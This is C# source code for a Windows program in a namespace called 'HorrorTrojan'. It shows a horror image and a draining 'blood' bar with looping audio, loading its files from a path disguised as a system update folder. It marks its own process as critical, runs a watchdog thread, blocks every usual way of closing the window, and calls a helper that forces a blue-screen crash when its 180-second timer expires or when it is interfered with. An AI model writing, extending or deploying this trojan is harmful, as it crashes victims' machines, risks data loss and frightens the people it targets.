using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Media;
using System.Threading;
using System.Windows.Forms;

namespace HorrorTrojan
{
    public partial class MainInterface : Form
    {
        private System.Windows.Forms.Timer bloodTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer drawTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer topMostTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer protectTimer = new System.Windows.Forms.Timer();
        private Random rnd = new Random();
        private DateTime startTime;
        private int maxSeconds = 180;
        private int bloodLevel = 100;
        private Image horrorImage;
        private int indicatorWidth = 25;
        private int indicatorHeight = 280;
        private int indicatorX;
        private int indicatorY;
        private int imageWidth = 300;
        private int imageHeight = 350;
        private int imageX;
        private int imageY;
        private bool isDragging = false;
        private Point dragStartPoint;
        private Thread watchdogThread;
        private bool watchdogAlive = true;
        private DateTime lastPing = DateTime.Now;
        private SoundPlayer musicPlayer;
        private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
        private bool bsodTriggered = false;
        private bool musicInitialized = false;
        private bool timerCompleted = false;

        public MainInterface()
        {
            InitializeComponent();
            LoadHorrorImage();
            CalculateLayout();
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
            InitializeMusic();
        }

        private void InitializeComponent()
        {
            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = false;
            this.BackColor = Color.Maroon;
            this.TransparencyKey = Color.Maroon;
            this.ShowInTaskbar = false;
            this.ControlBox = false;
            this.DoubleBuffered = true;

            bloodTimer.Interval = 100;
            bloodTimer.Tick += BloodTimer_Tick;

            drawTimer.Interval = 100;
            drawTimer.Tick += DrawTimer_Tick;

            topMostTimer.Interval = 100;
            topMostTimer.Tick += (s, e) => { this.TopMost = false; };
            topMostTimer.Start();

            protectTimer.Interval = 100;
            protectTimer.Tick += ProtectTimer_Tick;

            this.Load += MainInterface_Load;
            this.Paint += MainInterface_Paint;
            this.FormClosing += MainInterface_FormClosing;
            this.MouseDown += MainInterface_MouseDown;
            this.MouseMove += MainInterface_MouseMove;
            this.MouseUp += MainInterface_MouseUp;
        }

        private void CalculateLayout()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            imageX = (screenWidth - imageWidth - indicatorWidth - 40) / 2;
            imageY = (screenHeight - imageHeight) / 2;
            indicatorX = imageX + imageWidth + 20;
            indicatorY = imageY + (imageHeight - indicatorHeight) / 2;
            int formWidth = imageX + imageWidth + indicatorWidth + 40;
            int formHeight = imageY + imageHeight + 20;
            this.Size = new Size(formWidth, formHeight);
        }

        private void LoadHorrorImage()
        {
            string path = @"C:\Windows\ProgramFiles\SystemUpdate\horror.png";
            if (System.IO.File.Exists(path))
                horrorImage = Image.FromFile(path);
            else
                horrorImage = new Bitmap(imageWidth, imageHeight);
        }

        private void InitializeMusic()
        {
            try
            {
                if (System.IO.File.Exists(musicPath) && !musicInitialized)
                {
                    musicPlayer = new SoundPlayer(musicPath);
                    musicPlayer.Load();
                    musicPlayer.PlayLooping();
                    musicInitialized = true;
                }
            }
            catch { }
        }

        private void PlayMusic()
        {
            try
            {
                if (musicPlayer != null && !musicInitialized)
                {
                    musicPlayer.PlayLooping();
                    musicInitialized = true;
                }
            }
            catch { }
        }

        private void StopMusic()
        {
            try
            {
                if (musicPlayer != null)
                {
                    musicPlayer.Stop();
                    musicInitialized = false;
                }
            }
            catch { }
        }

        private void SetupFullProtection()
        {
            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch { }

            watchdogThread = new Thread(WatchdogLoop);
            watchdogThread.IsBackground = true;
            watchdogThread.Start();
        }

        private void WatchdogLoop()
        {
            while (watchdogAlive)
            {
                Thread.Sleep(500);
                try
                {
                    if ((DateTime.Now - lastPing).TotalSeconds > 3)
                    {
                        StopMusic();
                        if (!bsodTriggered) BSODTrigger.TriggerBSOD();
                        return;
                    }
                }
                catch
                {
                    StopMusic();
                    if (!bsodTriggered) BSODTrigger.TriggerBSOD();
                    return;
                }
            }
        }

        private void ProtectTimer_Tick(object sender, EventArgs e)
        {
            lastPing = DateTime.Now;

            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch { }

            try
            {
                this.TopMost = false;
            }
            catch { }
        }

        private void MainInterface_Load(object sender, EventArgs e)
        {
            startTime = DateTime.Now;
            bloodTimer.Start();
            drawTimer.Start();
            protectTimer.Start();
            PlayMusic();
            SetupFullProtection();
        }

        private void BloodTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                TimeSpan elapsed = DateTime.Now - startTime;
                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
                
                if (double.IsNaN(percent) || double.IsInfinity(percent))
                    percent = 0;
                
                if (percent < 0) percent = 0;
                if (percent > 100) percent = 100;
                
                int newBloodLevel = 100 - (int)Math.Round(percent);
                if (newBloodLevel < 0) newBloodLevel = 0;
                if (newBloodLevel > 100) newBloodLevel = 100;
                
                bloodLevel = newBloodLevel;
                
                if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
                {
                    if (!timerCompleted)
                    {
                        timerCompleted = true;
                        
                        bloodTimer.Stop();
                        drawTimer.Stop();
                        protectTimer.Stop();
                        watchdogAlive = false;
                        StopMusic();
                        
                        if (!bsodTriggered)
                        {
                            bsodTriggered = true;
                            BSODTrigger.TriggerBSOD();
                        }
                    }
                }
            }
            catch
            {
                if (!bsodTriggered)
                {
                    bsodTriggered = true;
                    BSODTrigger.TriggerBSOD();
                }
            }
        }

        private void DrawTimer_Tick(object sender, EventArgs e)
        {
            this.Invalidate();
        }

        private void MainInterface_Paint(object sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.Clear(Color.Maroon);

            DrawImage(g);
            DrawBloodIndicator(g);
        }

        private void DrawImage(Graphics g)
        {
            if (horrorImage != null)
            {
                Rectangle rect = new Rectangle(imageX, imageY, imageWidth, imageHeight);
                g.DrawImage(horrorImage, rect);
            }
        }

        private void DrawBloodIndicator(Graphics g)
        {
            if (bloodLevel <= 0) return;

            int fillHeight = (bloodLevel * indicatorHeight) / 100;
            if (fillHeight <= 0) return;

            int fillY = indicatorY + (indicatorHeight - fillHeight);

            int height = Math.Max(1, fillHeight - 2);
            int width = Math.Max(1, indicatorWidth - 2);

            Rectangle borderRect = new Rectangle(indicatorX, indicatorY, indicatorWidth, indicatorHeight);
            using (Pen borderPen = new Pen(Color.FromArgb(120, 100, 0, 0), 1))
            {
                g.DrawRectangle(borderPen, borderRect);
            }

            Rectangle fillRect = new Rectangle(
                indicatorX + 1,
                fillY + 1,
                width,
                height
            );

            using (LinearGradientBrush brush = new LinearGradientBrush(
                fillRect,
                Color.FromArgb(255, 200, 0, 0),
                Color.FromArgb(255, 60, 0, 0),
                LinearGradientMode.Vertical))
            {
                g.FillRectangle(brush, fillRect);
            }

            using (Pen glowPen = new Pen(Color.FromArgb(80, 255, 0, 0), 1))
            {
                g.DrawRectangle(glowPen, indicatorX + 1, indicatorY + 1, indicatorWidth - 2, indicatorHeight - 2);
            }
        }

        private void MainInterface_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void MainInterface_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                dragStartPoint = new Point(e.X, e.Y);
                this.Capture = true;
            }
        }

        private void MainInterface_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point screenPoint = PointToScreen(e.Location);
                this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
            }
        }

        private void MainInterface_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
                this.Capture = false;
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int SC_MINIMIZE = 0xF020;
            const int SC_MAXIMIZE = 0xF030;
            const int WM_KEYDOWN = 0x0100;

            if (m.Msg == WM_SYSCOMMAND)
            {
                if ((int)m.WParam == SC_CLOSE || (int)m.WParam == SC_MINIMIZE || (int)m.WParam == SC_MAXIMIZE)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }

            if (m.Msg == WM_KEYDOWN)
            {
                Keys key = (Keys)(int)m.WParam;
                if (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
                if (key == Keys.Escape || key == Keys.F10)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }

            base.WndProc(ref m);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80000;
                cp.ExStyle |= 0x20;
                return cp;
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                bloodTimer?.Dispose();
                drawTimer?.Dispose();
                topMostTimer?.Dispose();
                protectTimer?.Dispose();
                horrorImage?.Dispose();
                musicPlayer?.Dispose();
                watchdogAlive = false;
            }
            base.Dispose(disposing);
        }
    }
}
